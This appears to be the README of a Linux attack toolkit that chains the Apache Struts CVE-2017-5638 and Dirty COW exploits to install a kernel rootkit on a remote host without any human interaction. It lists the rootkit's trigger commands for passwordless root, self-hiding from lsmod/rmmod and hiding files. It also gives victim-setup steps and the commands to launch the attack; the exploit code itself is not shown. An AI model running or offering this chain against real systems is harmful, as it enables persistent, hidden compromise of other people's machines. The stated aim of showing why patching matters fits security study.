# RemoteKit

## What is this?

This is a full-chain exploit for Linux, using some well-known (and now
patched) exploits to install a rootkit remotely on a vulnerable system.

The rootkit has three functionalities, accessible by writing to the
file `/proc/sys/rootkit` once installed:

```
# Give the calling process root permissions w/o password
echo i_can_haz_root > /proc/sys/rootkit

# Hide the rootkit, so that it cannot be uninstalled and is
# invisible to lsmod/rmmod
echo im_in_ur_kernel > /proc/sys/rootkit

# Hide any file on the filesystem (you can even hide the
# /proc/sys/rootkit file for maximum lulz)
echo cant_touch_this $your_file_path > /proc/sys/rootkit
```

## Goals

Only technical vulnerabilities, no social engineering (phishing, etc). The
intended goal is to explore how easy it is to attack unpatched machines,
using only publicly documented exploits. The attack should be automated from
start to finish - no human interaction required.

Patch your machines, people!

## Setup (victim host)

To install the rootkit without having root access, you will need a kernel
that is vulnerable to the dirtycow exploit. The newest version that is
still vulnerable is 4.8.2. If you are running Ubuntu 16.04, you can install
it using:

```
curl -O http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.8.2/linux-image-4.8.2-040802-generic_4.8.2-040802.201610161339_amd64.deb
curl -O http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.8.2/linux-headers-4.8.2-040802-generic_4.8.2-040802.201610161339_amd64.deb
curl -O http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.8.2/linux-headers-4.8.2-040802_4.8.2-040802.201610161339_all.deb
sudo dpkg -i *.deb
```

You may need to modify your GRUB config to select this kernel version
at boot. Use `uname -r` to check your running kernel version.

To install the rootkit from a remote machine, you also need to install Apache
Struts. We are using CVE-2017-5638 (yes, the same one that pwned Equifax).
Download [Tomcat](http://apache.mirrors.tds.net/tomcat/tomcat-8/v8.5.30/bin/apache-tomcat-8.5.30.tar.gz) and untar it anywhere convenient. Download [Struts 2.5.10](https://archive.apache.org/dist/struts/2.5.10/struts-2.5.10-all.zip) and uncompress it.
Install Struts 2 by copying the REST example to webapps directory (`$CATALINA_HOME$` being the root directory of Tomcat, `$STRUTS$` being the Struts 2 directory):

```
cp $STRUTS$/apps/struts2-rest-showcase.war $CATALINA_HOME$/webapps/ROOT.war
sudo $CATALINA_HOME$/bin/startup.sh
```

## Exploit (attacker host)

To remotely install the rootkit, run `./struts2.py <hostname of target>`.

If you want to install the rootkit locally (without root), run `make install`.

If you are already root, you can simply run `make && sudo insmod rootkit.ko`.
